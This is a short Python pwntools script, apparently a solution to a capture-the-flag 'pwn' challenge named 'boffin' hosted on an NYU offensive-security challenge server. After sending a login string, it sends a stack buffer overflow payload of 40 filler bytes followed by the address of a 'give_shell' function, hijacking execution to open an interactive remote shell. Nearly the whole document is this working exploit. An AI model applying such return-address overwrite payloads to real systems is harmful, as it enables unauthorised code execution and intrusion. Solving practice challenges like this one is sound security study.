#This is a pwn challenge
#pretty simple
#I just tried to look for a basic function such as "get_shell" in IDA/gdb. 
#when i found it, I wrote the following code to get hold of the remote shell.

from pwn import*
e = ELF('./boffin')
#p = process('./boffin')
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1337)
#gdb.attach(p)
p.sendline("aa6243")
p.recvline()
p.sendline("A"*40 + p64(e.symbols['give_shell']))
p.interactive()
